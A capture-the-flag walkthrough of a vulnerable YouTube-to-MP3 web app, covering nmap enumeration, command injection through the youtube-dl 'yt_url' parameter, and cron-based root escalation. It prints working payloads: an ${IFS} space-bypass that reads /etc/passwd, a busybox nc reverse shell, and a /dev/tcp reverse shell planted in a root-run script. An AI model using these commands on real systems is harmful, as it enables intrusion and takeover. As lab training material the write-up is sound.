## Enumeration

Lets start with the nmap scan.
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 18:22 +0545
Nmap scan report for 10.10.34.159 (10.10.34.159)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.76 seconds
```

Hmmm lets see whats in port 80.
![](Pasted%20image%2020250329005821.png)
Hmm as the name suggest,it converts a video or mp4 to mp3.
Hmmm lets check for any special features that we might need.
![](Pasted%20image%2020250329005836.png)
And interesingly,it asks for video id.
Hmmm.

Ohhh after seeing the souce code,i found out that it was asking for youtube video id.
![](Pasted%20image%2020250329005851.png)

Hmmm so as that code,it asks for video id of youtube and make us able to download the mp3 version.
Lets just check by passing one video from youtube.
![](Pasted%20image%2020250329005910.png)
Lets pass this videos id.
Ohh this is long video,lets use shorter one.
![](Pasted%20image%2020250329005922.png)

Lets see how it works.
![](Pasted%20image%2020250329005933.png)
I don't know why but its taking very long.

And few more things from directory busting.
![](Pasted%20image%2020250329005945.png)
And authentication in `/admin`.
![](Pasted%20image%2020250329005957.png)

But we don't have any username or password.
Hmmm.
And there is `/tmp` which is forbidden.
Hmmm interesting.

I captured the requests in burp.
![](Pasted%20image%2020250329010007.png)

Hmm so `yt_url` parameter is going on that video.
But what can we do here?
SSRF,LFI or just huge rabbithole.

Hmm interesting.
![](Pasted%20image%2020250329010019.png)

Hmmm very very interesting.
According to it,there is downloads folder in `/tmp` and there is mp3 file but there is nothing.
![](Pasted%20image%2020250329010029.png)

Hmmm,I am missing something.
So as far I understand it download the mp3 from passed video and save that in `/tmp/downloads` as mp3 file.

![](Pasted%20image%2020250329010040.png)
Hmm.

I guess we can do ssrf.
![](Pasted%20image%2020250329010059.png)

Hmm interesting.
And I am stuck for few hours.
Okay lets just see the part of writeup.
Hmmm so from the result we have got for now reveals that its using something `youtube-dl`.
Lets search for it.
![](Pasted%20image%2020250329010123.png)

## Exploit

Hmm interesting.
And command injection was also possible cause its running a command of `youtube-dl`,so we can use pipe to inject command too.
![](Pasted%20image%2020250329010133.png)

Okay lets continue to get shell or something.
But again it is not compatible.
We can't run long commands and many more.
(we couldn't use spaces i guess)

After some talk with chatGPT,we came up with this.
```Bash
yt_url=|cat${IFS}/etc/passwd;
```

So here that `${IFS}` worked as a space.

We could now read files easily.
![](Pasted%20image%2020250329010144.png)

Great.Now lets try to get shell or complete this rooms's goal.
We can read index.php.
![](Pasted%20image%2020250329010212.png)
![](Pasted%20image%2020250329010224.png)
We got the flag.txt.

As well as there is `.htaccess`file.
![](Pasted%20image%2020250329010243.png)
![](Pasted%20image%2020250329010332.png)


Now we can read that.
![](Pasted%20image%2020250329010344.png)

Lets crack the password hash.
![](Pasted%20image%2020250329010355.png)

## Foothold

And now we can login.
But I was wondering if we can execute command,can i get shell from that.
I tried different things but this one worked.
```bash
busybox${IFS}nc${IFS}ip${IFS}9999${IFS}-e${IFS}sh;
```
![](Pasted%20image%2020250329010411.png)

Lets also do it from `/admin`.
Cause we can also execute command by that cause we can see this.
![](Pasted%20image%2020250329010422.png)

So lets login and execute command.
![](Pasted%20image%2020250329010433.png)

## Privelege Escalation

Now we have got the shell,lets try to escalate our priveleges.
Lets run [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).
Nothing interesting.
Lets also run [pspy](https://github.com/DominicBreuker/pspy/releases).


And we saw something interesting.
![](Pasted%20image%2020250329010455.png)
Hmm so clean.sh is running as root.
Lets check the permission of that script.
![](Pasted%20image%2020250329010506.png)

So we can edit and escalate to root.
I added this line in clean.sh.
```bash
sh -i >& /dev/tcp/ip/9999 0>&1
```

Now lets wait for some time and see if we got a root shell or not.
![](Pasted%20image%2020250329010518.png)

## Done

And done.
![](Pasted%20image%2020250329010530.png)

Again learned lots of things.I hope you are doing awesome.
Take Care!

